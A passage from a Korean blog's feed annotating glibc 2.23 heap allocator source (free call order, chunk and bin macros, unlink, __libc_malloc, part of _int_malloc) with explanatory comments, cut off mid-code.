호출</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// is_mmap flag가 설정되어있으면,</span></span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">    <span class="comment">// munmap_chunk 함수 호출</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>free 함수 호출 순서 : libc_free() -&gt; int_free() -&gt; systrim() or heap_trim() or munmap_chunk()</strong></p><ol><li>libc_free() 함수에서 mmap으로 할당된 메모리인지 확인한 후, 맞을 경우 munmap_chunk() 함수를 통해 메모리 해제</li><li>아닌 경우, 해제하고자 하는 chunk가 속한 Arena의 포인터를 획득한 후, int_free() 함수 호출</li><li>chunk를 해제한 후, 크기에 맞는 bin을 찾아 저장하고 top chunk와 병합을 할 수 있다면 병합 수행</li><li>병합된 top chunk가 너무 커서 Arena의 크기를 넘어선 경우, top chunk의 크기를 줄이기 위해 systrim() 함수 호출</li><li>문제가 없다면, heap_trim() 함수 호출</li><li>mmap으로 할당된 chunk라면 munmap_chunk()를 호출</li></ol><p><img src="https://blog.kakaocdn.net/dn/cM17SL/btqGmQDikKl/ktL2LiuRBLQQukCnPUKyN1/img.png" alt="1"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://kimvabel.tistory.com/88">https://kimvabel.tistory.com/88</a></li><li><a href="https://tribal1012.tistory.com/141?category=658553">https://tribal1012.tistory.com/141?category=658553</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Linux/">Linux</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/malloc/">malloc</category>
      
      <category domain="https://pwnkidhn.github.io/tags/heap/">heap</category>
      
      <category domain="https://pwnkidhn.github.io/tags/linux/">linux</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/08/06/2020-08-07-free_glibc_2_23/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>malloc (glibc-2.23)</title>
      <link>https://pwnkidhn.github.io/2020/08/02/2020-08-03-malloc_glibc_2_23/</link>
      <guid>https://pwnkidhn.github.io/2020/08/02/2020-08-03-malloc_glibc_2_23/</guid>
      <pubDate>Sun, 02 Aug 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;glibc-2.23 malloc 분석&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;source&lt;/strong&gt; : &lt;a href=&quot;https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c&quot;&gt;https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c&lt;/a&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>glibc-2.23 malloc 분석</li></ul><p><strong>source</strong> : <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c">https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c</a></p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></span><br><span class="line"><span class="comment">// 이전 chunk 사용여부 확인</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br><span class="line"><span class="comment">// mmap 할당 여부 확인</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">// main_arena 여부 확인</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">// 3가지 flag를 or 연산</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">// flag값을 제외한 실제 chunk 크기 확인</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br><span class="line"><span class="comment">// 다음 chunk = 현재chunk + 현재chunk 크기  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - ((p)-&gt;prev_size)))</span></span><br><span class="line"><span class="comment">// 이전 chunk = 현재chunk - 이전chunk 크기</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"><span class="comment">// chunk에 s를 더한 주소</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)      </span></span><br><span class="line">  ((((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span><br><span class="line"><span class="comment">// 다음 chunk의 prev_inuse 값을 확인</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)      </span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span><br><span class="line"><span class="comment">// 다음 chunk의 prev_inuse 값을 1로 set</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse(p)      </span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size &amp;= ~(PREV_INUSE)</span><br><span class="line"><span class="comment">// 다음 chunk의 prev_inuse 값을 0으로 set</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)      </span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line"><span class="comment">// chunk + s의 prev_inuse 값을 확인 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)      </span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span><br><span class="line"><span class="comment">// chunk + s의 prev_inuse 값을 1로 set</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)      </span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br><span class="line"><span class="comment">// chunk +s의 prev_inuse 값을 0으로 set</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i)</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))     </span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br><span class="line"><span class="comment">// m(arena)의 i(indx)의 bin의 주소를 저장</span></span><br><span class="line"><span class="comment">// 이때, 이 bin을 fd, bk를 가진 chunk로서 사용하기 위해 - 0x10 한 값을 저장한다.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"><span class="comment">// bins[]에서 다음 bin을 가져온다.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="comment">// 해당 binlist의 첫번째 chunk (가장 마지막으로 free된 chunk)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br><span class="line"><span class="comment">// 해당 binlist의 마지막 chunk (가장 먼저 free된 chunk)</span></span><br></pre></td></tr></table></figure><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD)     (P는 이전에 해제된 chunk의 주소)(밑에 수정)</span></span><br><span class="line"><span class="comment">// binlist에서 chunk 제거</span></span><br><span class="line">&#123;                                            </span><br><span class="line">    FD = P-&gt;fd;<span class="comment">// FD = 현재 chunk의 fd (다음 chunk)</span></span><br><span class="line">    BK = P-&gt;bk;<span class="comment">// BK = 현재 chunk의 bk (이전 chunk)     </span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    <span class="comment">// 다음 chunk의 bk(이전)이 현재 chunk가 아니거나, </span></span><br><span class="line">    <span class="comment">// 이전 chunk의 fd(다음)이 현재 chunk가 아니면</span></span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br><span class="line">    <span class="comment">// &quot;corrupted double-linked list&quot; exception 발생</span></span><br><span class="line">    <span class="keyword">else</span> &#123;     </span><br><span class="line">        FD-&gt;bk = BK;<span class="comment">// 다음 chunk-&gt;bk = 현재 chunk-&gt;bk     </span></span><br><span class="line">        BK-&gt;fd = FD;<span class="comment">// 이전 chunk-&gt;fd = 현재 chunk-&gt;fd</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)</span><br><span class="line">        <span class="comment">// 현재 chunk의 크기가 smallbin 범위에 해당하지 않고 (즉, large bin일 때)</span></span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>))&#123;</span><br><span class="line">            <span class="comment">// 현재 chunk의 fd_nextsize가 NULL이 아니면, (fd_nextsize, bk_nextsize 처리)</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// 다음 크기 chunk의 bk_nextsize(이전)이 현재 chunk가 아니거나,</span></span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>)) </span><br><span class="line">        <span class="comment">// 이전 크기 chunk의 fd_nextsize(다음)이 현재 chunk가 아니면,</span></span><br><span class="line">      malloc_printerr (check_action,     </span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">       P, AV);</span><br><span class="line">          <span class="comment">// &quot;corrupted double-linked list (not small)&quot; exception 발생</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 다음 chunk의 fd_nextsize가 NULL이고, </span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                <span class="comment">// 현재 chunk의 fd_nextsize가 자기자신이면,</span></span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                  <span class="comment">// 다음 chunk의 fd_nextsize, bk_nextsize를 자기자신으로,</span></span><br><span class="line">                <span class="keyword">else</span> &#123;      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                    <span class="comment">// 현재 chunk의 다음 크기 chunk를 다음 chunk의 다음 크기 chunk로</span></span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                    <span class="comment">// 현재 chunk의 이전 크기 chunk를 다음 chunk의 이전 크기 chunk로</span></span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                    <span class="comment">// 다음 chunk를 현재 chunk의 다음 크기 chunk의 이전 크기 chunk로</span></span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                    <span class="comment">// 다음 chunk를 현재 chunk의 이전 크기 chunk의 다음 크기 chunk로</span></span><br><span class="line">                  &#125;      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123; <span class="comment">// 다음 chunk의 fd_nextsize가 NULL이 아니라면,</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                <span class="comment">// 원래대로 복구</span></span><br><span class="line">              &#125;      </span><br><span class="line">          &#125;      </span><br><span class="line">      &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="comment">// __malloc_hook 포인터가 지정되어 있을 시 hook 함수 실행</span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// ar_ptr에 heap영역으로 사용할 arena 주소를 저장 후 arena에 mutext_lock 설정</span></span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// _int_malloc 함수 호출, victim = 할당된 chunk 주소</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">  <span class="comment">// 제대로 할당되지 않으면</span></span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">      <span class="comment">// 재할당</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">  <span class="comment">// ar_ptr이 NULL이 아니면</span></span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">    <span class="comment">// arena에 mutex_unlock 설정</span></span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">  <span class="comment">// 할당된 chunk 주소 반환</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;           <span class="comment">// 요청한 size + header</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;             <span class="comment">// 할당에 연관된 bin의 index</span></span><br><span class="line">  mbinptr bin;                  <span class="comment">// 할당에 연관된 bin</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;             <span class="comment">// 특정 bin에서 할당 가능 여부를 검사중이거나 선택중인 chunk</span></span><br><span class="line">  INTERNAL_SIZE_T size;         <span class="comment">// 특정 chunk의 크기</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;             <span class="comment">// 특정 chunk의 bin의 index</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;          <span class="comment">// 분리되고 남은 remainder</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size; <span class="comment">// remainder의 size</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;           <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;             <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;             <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line">  <span class="comment">// bytes: 요청한 동적 할당 크기를 -&gt; nb: header + align된 memory 크기로 변환</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from mmap.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">  <span class="comment">// 사용가능한 arena가 없으면, (av = arena pointer) </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="comment">// sysmalloc(-&gt;mmap)으로 chunk 할당</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">      <span class="comment">// 할당된 chunk 주소 리턴</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">  <span class="comment">// nb가 global_max_fast보다 작거나 같을 경우 (fastbin에 포함될 경우)</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      <span class="comment">// fastbin에서 nb크기의 index를 idx에 저장</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="comment">// av-&gt;fastbinsY배열의 idx의 첫번째 chunk의 주소를 pp에 저장.</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="comment">// victim(pp)가 NULL일 경우 (알맞은 free chunk가 없는 경우) break;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>)) </span><br><span class="line">          <span class="comment">// 할당을 요청한 chunk(victim)의 크기가 fastbin과 일치하지 않으면</span></span><br><span class="line">          <span class="comment">// &quot;fastbin dup bypass&quot;</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">              <span class="comment">// &quot;malloc() : memory corruption (fast)&quot; exception 발생</span></span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">          <span class="comment">// 할당된 chunk 주소 리턴</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  <span class="comment">// nb가 smallbin_range에 있으면 (smallbin일 경우)</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      <span class="comment">// idx에 해당 크기의 smallbin 인덱스를 저장</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span 